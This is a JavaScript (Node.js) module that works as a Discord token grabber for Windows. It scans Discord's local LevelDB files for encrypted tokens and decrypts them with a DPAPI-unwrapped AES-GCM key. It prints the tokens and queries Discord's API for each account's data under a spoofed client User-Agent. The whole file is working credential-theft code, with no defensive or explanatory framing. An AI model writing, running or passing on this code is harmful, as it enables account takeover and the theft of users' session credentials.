const fs = require('fs')
const crypto = require('crypto')
const path = require('path')
const fetch = require('node-fetch')
const dpapi = require('win-dpapi')

if (process.platform !== 'win32') throw new Error('This only works on Windows')

const appDataPath = process.env.APPDATA
const discordPath = path.join(appDataPath, 'discord')
const discordDbPath = path.join(discordPath, 'Local Storage', 'leveldb')
const discordLocalStatePath = path.join(discordPath, 'Local State')

async function extractTokensFromDiscordDb() {
  const files = await fs.promises.readdir(discordDbPath)
  const tokens = new Set()
  await Promise.all(
    files
      .filter(f => f.endsWith('.ldb'))
      .map(async file => {
        const content = await fs.promises.readFile(path.join(discordDbPath, file), 'utf8')
        const tokensInFile = [...content.matchAll(/\"(dQw4w9WgXcQ:.*?)\"/g)].filter(x => x.length >= 2).map(x => x[1])
        tokensInFile.forEach(token => tokens.add(token))
      })
  )
  return [...tokens]
}

async function getDecryptionKey() {
  const localState = JSON.parse(await fs.promises.readFile(discordLocalStatePath, 'utf8')).os_crypt.encrypted_key
  const encryptedKey = Buffer.from(localState, 'base64').slice(5)
  const key = dpapi.unprotectData(Buffer.from(encryptedKey, 'utf-8'), null, 'CurrentUser')
  return key
}

async function decryptToken(token, decryptionKey) {
  token = token.split('dQw4w9WgXcQ:')[1]
  token = Buffer.from(token, 'base64')
  const nonce = token.slice(3, 15)
  const encryptedValue = token.slice(15, token.length - 16)
  const tag = token.slice(token.length - 16, token.length)
  const decipher = crypto.createDecipheriv('aes-256-gcm', decryptionKey, nonce)
  decipher.setAuthTag(tag)
  token = decipher.update(encryptedValue, 'base64', 'utf-8')
  token += decipher.final('utf-8')
  return token
}

function getUserData(token) {
  return fetch(`https://discordapp.com/api/v6/users/@me`, {
    headers: {
      Authorization: token,
      'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9005 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36'
    }
  }).then(res => res.json())
}

const run = async () => {
  const extractedTokens = await extractTokensFromDiscordDb()
  const decryptionKey = await getDecryptionKey()

  const tokens = new Set()
  for (const extractedToken of extractedTokens) {
    // TODO: Support unencrypted tokens
    const isEncrypted = true
    if (isEncrypted) {
      const token = await decryptToken(extractedToken, decryptionKey)
      tokens.add(token)
    }
  }
  console.log(tokens)

  const output = {}
  for (const token of tokens) {
    output[token] = await getUserData(token)
  }
  console.log(output)
  return output
}

module.exports = { run }
